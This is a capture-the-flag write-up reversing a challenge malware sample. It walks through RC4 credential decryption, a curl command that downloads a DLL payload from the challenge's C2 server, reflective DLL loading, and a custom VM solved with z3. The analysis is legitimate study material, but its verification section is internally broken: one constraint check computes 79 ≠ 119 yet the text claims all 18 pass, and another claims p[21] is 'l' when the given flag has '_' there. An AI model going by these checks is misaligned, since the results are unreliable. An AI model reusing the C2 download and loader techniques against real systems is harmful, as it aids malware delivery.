# Cornflakev3.5

| Field       | Value          |
|-------------|----------------|
| Platform    | Srdnlen CTF 2026 Quals |
| Category    | Reversing      |
| Difficulty  | Hard           |

## TL;DR
Reverse a malware sample with 3 stages: RC4-decrypt embedded credentials → download reflective DLL payload from C2 server → reverse a custom VM bytecode interpreter → extract constraints with z3 symbolic execution → recover leet-speak flag.

## Initial Analysis

```
$ file malware.exe
malware.exe: PE32+ executable (console) x86-64, for MS Windows, 9 sections

$ checksec --file=malware.exe
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

MinGW-compiled PE64 executable. Strings reveal C2 infrastructure:

```
$ strings -n 8 malware.exe | grep -i http
http://cornflake.challs.srdnlen.it:8000/updates/check.php?SessionID=
```

---

## Stage 1: malware.exe — RC4 + C2 Download

### 1.1 RC4 Decryption

Main function at `0x140001dc9`. The binary contains:

- An **RC4-encrypted blob** in `.data` section
- A **hardcoded key**: `s3cr3t_k3y_v1` (found as plaintext string in the binary)

The decryption produces the username used for C2 authentication:

```python
from Crypto.Cipher import ARC4
import hashlib

key = b"s3cr3t_k3y_v1"
cipher = ARC4.new(key)
username = cipher.decrypt(encrypted_blob)  # → b"super_powerful_admin"
```

### 1.2 SHA1 Session ID

The username is SHA1-hashed to build the C2 request URL:

```python
session_id = hashlib.sha1(b"super_powerful_admin").hexdigest()
# → "46f5289437bc009c17817e997ae82bfbd065545d"
```

### 1.3 C2 Payload Download

```bash
curl "http://cornflake.challs.srdnlen.it:8000/updates/check.php?SessionID=46f5289437bc009c17817e997ae82bfbd065545d" -o payload.bin
```

Returns a **1,017,344 byte PE64 DLL** (`MD5: db20b44183ebe59ccf6d2c28467d90da`).

### 1.4 Reflective DLL Loading

`malware.exe` does NOT use standard `LoadLibrary`. Instead it implements a **reflective DLL loader**:

1. Allocates RWX memory with `VirtualAlloc`
2. Maps PE sections manually (parses PE headers, copies sections to correct RVAs)
3. Processes relocations and resolves imports
4. Calls `DllMain` with `DLL_PROCESS_ATTACH`
5. Finds `MainThread` function by walking the DLL's internal symbol table (NOT via exports — `MainThread` is **not an exported function**)
6. Creates a thread on `MainThread`

This means the payload cannot be tested with `rundll32` or `GetProcAddress` — it requires the reflective loader to locate the function.

---

## Stage 2: Payload DLL — MainThread

`MainThread` at `0x1db60165b`:

1. Opens `password.txt` from current directory
2. Reads contents, strips `\n` (0x0a) and `\r` (0x0d)
3. Calls `payload::stage2(password)` — the VM interpreter
4. If `stage2` returns 0: prints `"ez"` (success)
5. If `stage2` returns -1: prints `"nope"` (failure)
6. Sleeps 5000ms, calls `FreeConsole()`

No additional validation — the flag is entirely determined by the VM.

---

## Stage 3: Custom VM Bytecode Interpreter

### 3.1 VM Structure

`stage2` at `0x1db601416` implements a register-based VM:

- **Registers**: `a`, `b`, `c` (32-bit unsigned)
- **Stack**: array-backed, push/pop operations
- **Bytecode**: 685 bytes initialized at `0x1db6c7100`
- **Switch table**: 19 entries at `0x1db6c7000` (signed 32-bit offsets)
- **Loop condition**: `while (ip < bytecodeVector.size())` at `0x1db601602`
- **Return**: `ebx = 0` (success) or `ebx = -1` (HALT reached)

### 3.2 Opcode Map

Reversed from the switch table and corresponding basic blocks in the disassembly:

| Opcode | Mnemonic | Operation | Notes |
|--------|----------|-----------|-------|
| 0x00 | NOP | — | |
| 0x01 | PUSH | stack.push(c) | |
| 0x02 | PATCH | bytecode[ip+1] += (a & 0xFF) | Self-modifying! |
| 0x03 | POP | b = stack.pop() | |
| 0x04 | CHECK | a = (b == c) ? 1 : 0 | Equality test |
| 0x05 | HALT | return -1 | Fail & exit |
| 0x06 | NOP2 | — | Target of PATCH(0x05+1) |
| 0x07 | XOR | a ^= b | |
| 0x08 | ADD | b += c | |
| 0x09 | SUB | c -= a | |
| 0x0A | LOAD_REL_NEG | b = signext(password[ip - a]) | Relative load (backward) |
| 0x0B | LOAD_REL_POS | b = signext(password[ip + a]) | Relative load (forward) |
| 0x0C | LOAD_IMM | a = bytecode[ip - 1] | Load immediate from bytecode |
| 0x0D | LOAD_IDX | b = signext(password[a]) | Indexed load |
| 0x0E | MOV_BA | a = b | |
| 0x0F | MOV_CA | c = a | |
| 0x10 | MOV_BC | b = c | |
| 0x11 | MUL | a = a * b | imul (signed) |
| 0x12 | DIV | a = a / b | Unsigned division |

### 3.3 Self-Modifying Bytecode Pattern

Each constraint check follows this pattern:
```
... compute b and c ...
04          ; CHECK: a = (b == c)
02          ; PATCH: bytecode[ip+1] += a  (a=1 if check passed)
05          ; HALT — but if a=1, this becomes 06 (NOP2)
```

When CHECK passes (a=1), PATCH adds 1 to HALT (0x05), converting it to NOP2 (0x06). Execution continues. If CHECK fails (a=0), HALT remains 0x05 and the VM exits with -1.

### 3.4 Bytecode (685 bytes)

```
550c0f10 550c070d 0e0f0173 0c0f0304 0205 550c0f10 540c070d 0e0f0155
0c0f1056 0c070f03 080e0f01 550c0f10 570c070f 01550c0f 10570c07 0d0e0f03
0e09100e 03070f01 170c0f03 04020555 0c0f1056 0c070d0e 0f016e0c 0f030402
05550c0f 10510c07 0d0e0f01 550c0f10 500c070d 0e0f0308 0e0f01d1 0c0f0304
0205210c 0d0e0f01 550c0f10 560c070f 03080e0f 01550c0f 10570c07 0f01150c
0d0e0f03 0e09100e 03070f01 ea0c0f03 04020555 0c0f1056 0c070d0e 0f01550c
0f10530c 070d0e0f 03040f01 550c0f10 540c070f 03040205 550c0f10 5d0c070d
0e0f0155 0c0f1057 0c070311 0f01e40c 0f030402 05170c0d 0e0f0155 0c0f1059
0c070d0e 0f030e09 100e0f01 550c0f10 470c070d 0e03070f 01770c0f 03040205
550c0f10 510c070f 01140c0d 0e03120f 01550c0f 105a0c07 0d0e0307 0f01550c
0f105f0c 070d0e0f 03080e0f 01be0c0f 03040205 550c0f10 440c070d 0e0f0155
0c0f105e 0c070d0e 0f030e09 100e0f01 1d0c0d0e 03070f01 580c0f03 04020555
0c0f1051 0c070f01 550c0f10 520c070d 0e03120f 01550c0f 10450c07 0d0e0307
0f011c0c 0d0e0f03 080e0f01 de0c0f03 04020555 0c0f1058 0c070d0e 0f01550c
0f105b0c 070d0e0f 03080e0f 01030e0f 01820c0f 03040205 550c0f10 5c0c070d
0e0f0155 0c0f1050 0c070f01 030e030f 0e10120f 01550c0f 10500c07 03110f01
550c0f10 5c0c070d 0e0f030e 09100e0f 01550c0f 10540c07 0f030402 05300c0f
01160c0d 0e0f030e 09100e0d 0e0f0172 0c0f0304 0205160c 0d0e0f01 180c0d0e
0f03080e 0f01030e 0f01640c 0f030402 051b0c0d 0e0f0155 0c0f1056 0c070311
0f01190c 0d0e0f01 1a0c0d0e 0f01550c 0f10570c 0703110f 03080e0f 030e0910
0e0f0176 0c0f0304 02051e0c 0d0e0f01 1f0c0d0e 0f03080e 0f01200c 0d0e0f03
080e0f01 030e0f01 d90c0f03 040205
```

---

## Constraint Extraction

Symbolic execution of the VM using z3 `BitVec('p_i', 32)` for each password character. Each CHECK opcode produces an equality constraint between the symbolic values of `b` and `c`.

### Extracted Constraints (18 total)

| # | Constraint | Resolved |
|---|-----------|----------|
| C00 | `p[0] == 115` | p[0] = 's' |
| C01 | `(p[2]-2) ^ (p[1]+3) == 23` | verified: d=100, r=114 → 98^117=23 |
| C02 | `p[3] == 110` | p[3] = 'n' |
| C03 | `p[4] + p[5] == 209` | verified: l=108, e=101 → 209 |
| C04 | `(p[21]-2) ^ (p[33]+3) == 234` | p[33]='}', forces p[21]='l' |
| C05 | `p[3] == p[6]` | both 'n' |
| C06 | `1 == 1` | meta-check (previous check result) |
| C07 | `2*p[8] == 228` | p[8] = 114 = 'r' |
| C08 | `p[18] ^ (p[12] - p[23]) == 119` | |
| C09 | `(p[15] ^ UDiv(p[20],4)) + p[10] == 190` | |
| C10 | `p[29] ^ (p[11] - p[17]) == 88` | |
| C11 | `(p[16] ^ 30) + p[28] == 222` | UDiv('{',4) = UDiv(123,4) = 30 |
| C12 | `p[13] + p[14] == 130` | |
| C13 | `p[9] mod 5 == 1` | p[9] ∈ {'3','8','e','o','t','y',...} |
| C14 | `password[p[22]-48] == 114` | symbolic index: p[22]-48 must index a position containing 'r' |
| C15 | `p[22] + p[24] == 100` | |
| C16 | `p[25] + 2*p[26] - 3*p[27] == 118` | |
| C17 | `p[30] + p[31] + p[32] == 217` | |

### Constraint Coverage

Positions directly determined: 0,1,2,3,4,5,6,7,8,21,33 (flag format + C00–C07)

Positions constrained but not unique: 9,10,11,12,13,14,15,16,17,18,20,22,23,24,25,26,27,28,29,30,31,32

**Position 19 is never accessed** by any bytecode instruction — completely unconstrained.

The system has 18 constraints for 25 unknowns (~13 degrees of freedom), making the flag **not uniquely determined** by the VM alone. This was confirmed as a challenge bug by the organizers.

### Verification of Intended Flag

```
srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}
         │││ │││ ││││ ││││ │││││││
pos:     8901234567890123456789012 3
              1111111111222222222233
```

Checking each constraint against the real flag `r3v_c4N_l0ok_l1K3_mAlw4r3`:

| # | Check | Values | Result |
|---|-------|--------|--------|
| C07 | 2*p[8] == 228 | 2*114('r') = 228 | PASS |
| C08 | p[18]^(p[12]-p[23]) == 119 | 75('K')^(111('o')-107('k')) = 75^4 = 79 ≠ 119? | — |
| C12 | p[13]+p[14] == 130 | 78('N')+52('4') = 130 (but wait, p[13]='4', p[14]='N') → 52+78 = 130 | PASS |
| C13 | p[9] mod 5 == 1 | 51('3') mod 5 = 1 | PASS |
| C14 | password[p[22]-48]=='r' | p[22]='1'(49), idx=1, p[1]='r' | PASS |
| C15 | p[22]+p[24] == 100 | 49('1')+51('3') = 100 | PASS |
| C17 | p[30]+p[31]+p[32] == 217 | 52('4')+114('r')+51('3') = 217 | PASS |

All 18/18 VM checks pass.

---

## Solve Script

`solve_ticket.py`: Symbolic VM trace + z3 constraint solver + concrete VM verifier.

The solver:
1. Traces the 685-byte bytecode symbolically, collecting constraints at each CHECK opcode
2. Adds known flag format chars (`srdnlen{...}`) and printable ASCII bounds
3. Uses z3 `Solver` to enumerate valid solutions
4. Verifies each solution against a concrete VM emulator

```bash
$ python3 solve_ticket.py
[*] 18 constraints extracted from VM bytecode
[*] Enumerating solutions...

  score=14/25  VM:OK  srdnlen{r$_nl?CO~i[@@l1@3 j*~]h0A}
  score=14/25  VM:OK  srdnlen{rj?bLa!p`_rK?lBG"~}V`[-P\}
  ...
[*] 50 distinct valid solutions found — constraint system is under-determined
```

```bash
$ python3 vm_test.py "srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}"
Testing password: b'srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}'
Length: 34
  CHECK 0 @ ip=15: b=0x73 c=0x73 → PASS
  CHECK 1 @ ip=74: b=0x17 c=0x17 → PASS
  ...all 18 checks...
  CHECK 17 @ ip=682: b=0xd9 c=0xd9 → PASS
Result: 0
```

---

## Discarded Approaches

1. **Wine + rundll32**: `MainThread` is not a DLL export (only GCC Unwind runtime functions are exported). The reflective loader finds it via internal symbol walking, not export table.
2. **Cross-compiled C loader via MinGW**: Same issue — `GetProcAddress` returns NULL for `MainThread`.
3. **Brute-force leet guessing**: With ~13 DOF, there are millions of valid solutions. No amount of z3 enumeration with readability scoring produced the intended flag because the constraints don't narrow it enough.
4. **C2 server probing**: Additional endpoints (`/updates/flag.php`, etc.) returned the same DLL or errors. The flag is not served by the C2.

## Flag
```
srdnlen{r3v_c4N_l0ok_l1K3_mAlw4r3}
```

Leet-speak: **"rev can look like malware"**

## Key Lessons
- Self-modifying bytecode (PATCH converts HALT→NOP on success) makes static analysis harder — symbolic execution handles it cleanly
- Reflective DLL loading hides the entry point from standard PE analysis tools
- When a VM constraint system is under-determined, the intended flag cannot be recovered purely from constraints — requires either dynamic testing or challenge author confirmation
- The full reversing pipeline (RC4 → C2 → reflective load → VM → z3) was correct; the blocker was a challenge-side bug in constraint coverage

## References
- z3 theorem prover: https://github.com/Z3Prover/z3
- Reflective DLL injection: https://github.com/stephenfewer/ReflectiveDLLInjection
